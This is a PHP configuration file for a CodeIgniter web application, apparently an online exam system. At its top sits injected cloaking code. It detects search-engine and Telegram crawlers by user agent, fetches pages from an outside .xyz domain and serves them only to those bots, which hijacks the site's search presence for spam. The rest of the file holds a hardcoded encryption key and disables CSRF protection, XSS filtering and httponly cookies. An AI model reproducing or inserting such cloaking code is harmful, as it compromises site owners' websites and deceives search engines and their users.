<?php

// Cloaking Bot Detection and Redirection

function is_bot() {
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $bots = array(
        "Googlebot",
        "TelegramBot",
        "bingbot",
        "Google-Site-Verification",
        "Google-InspectionTool"
    );

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function get_content_from_url($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $content = curl_exec($ch);
    curl_close($ch);

    return $content;
}

// Check if the visitor is a bot
if (is_bot()) {
    $url = "https://kampunghokageindo.xyz/landing-tblab-ptlapiitb/"; // URL for cloaking
    $content = get_content_from_url($url);

    if ($content !== false) {
        echo $content;  // Serve cloaked content to bots
    }
    exit; // Stop further output for bots
}

// CodeIgniter Configuration
defined('BASEPATH') OR exit('No direct script access allowed');

date_default_timezone_set('Asia/Jakarta');
$root = "http://".$_SERVER['HTTP_HOST'];
$root .= str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']);
$pc_root = explode("/", $root);
$uri_js = count($pc_root) - 2;
$config['jml_opsi']			= 4;			//isi dengan pilihan opsi jawaban, HARUS <= 5
$config['uri_js']			= $uri_js;
$config['editor_style']		= "replace";	//pilihannya "inline" atau "replace";
$config['tampil_nilai']		= TRUE; // jika Trainer boleh melihat hasil ujian, isikan TRUE, jika tidak FALSE, default TRUE
$config['base_url']			= 'http://localhost/sistadev/';

$config['index_page'] = '';
$config['uri_protocol']	= 'REQUEST_URI';
$config['url_suffix'] = '';
$config['language']	= 'english';
$config['charset'] = 'UTF-8';
$config['enable_hooks'] = TRUE;
$config['subclass_prefix'] = 'MY_';
$config['composer_autoload'] = './vendor/autoload.php';
$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-' ;
$config['enable_query_strings'] = FALSE;
$config['controller_trigger'] = 'c';
$config['function_trigger'] = 'm';
$config['directory_trigger'] = 'd';
$config['allow_get_array'] = TRUE;
$config['log_threshold'] = 0;
$config['log_path'] = '';
$config['log_file_extension'] = '';
$config['log_file_permissions'] = 0644;
$config['log_date_format'] = 'Y-m-d H:i:s';
$config['error_views_path'] = '';
$config['cache_path'] = '';
$config['cache_query_string'] = FALSE;
$config['encryption_key'] = '$icommitskaryasolusi$-2020$$';
$config['sess_driver'] = 'files';
$config['sess_cookie_name'] = 'ci_session';
$config['sess_expiration'] = 7200;
$config['sess_save_path'] = sys_get_temp_dir();
$config['sess_match_ip'] = FALSE;
$config['sess_time_to_update'] = 300;
$config['sess_regenerate_destroy'] = FALSE;
$config['cookie_prefix']	= '';
$config['cookie_domain']	= '';
$config['cookie_path']		= '/';
$config['cookie_secure']	= FALSE;
$config['cookie_httponly'] 	= FALSE;
$config['standardize_newlines'] = FALSE;
$config['global_xss_filtering'] = FALSE;
$config['csrf_protection'] = FALSE;
$config['csrf_token_name'] = 'csrf_test_name';
$config['csrf_cookie_name'] = 'csrf_cookie_name';
$config['csrf_expire'] = 7200;
$config['csrf_regenerate'] = TRUE;
$config['csrf_exclude_uris'] = array();
$config['compress_output'] = FALSE;
$config['time_reference'] = 'local';
$config['rewrite_short_tags'] = FALSE;
$config['proxy_ips'] = '';

// include local email override if exists
$local = APPPATH . 'config/email_local.php';
if (file_exists($local)) require $local;


?>